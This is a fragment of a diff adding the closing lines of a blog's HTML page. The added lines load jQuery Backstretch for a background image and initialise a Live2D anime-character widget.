+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+  <script>
+  $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
+  </script>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
+</html>
